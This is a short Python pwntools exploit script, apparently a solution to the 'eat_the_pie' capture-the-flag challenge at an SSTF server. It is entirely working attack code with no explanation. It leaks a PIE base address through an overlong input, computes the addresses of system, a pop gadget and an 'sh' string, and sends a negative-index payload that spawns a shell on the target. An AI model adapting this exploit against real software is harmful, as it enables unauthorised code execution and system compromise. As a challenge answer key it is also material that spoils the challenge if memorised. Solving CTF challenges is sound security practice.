from pwn import *

#r = process("./eat_the_pie")
r = remote("eat-the-pie.sstf.site", 1337)

r.recvuntil("> ")
r.sendline("9"*15)
r.recvuntil("9"*15)
r.recvline()

pie = u32(r.recv(4)) - 0x74d
print(hex(pie))

pop3 = pie + 0x00000a99 # pop esi ; pop edi ; pop ebp ; ret
system = pie + 0x000005A0
sh = pie + 0x316 + 4
payload = "-2\x00\x00" + p32(system) + p32(pop3) + p32(sh)

r.recvuntil("> ")
r.send(payload)

r.interactive()

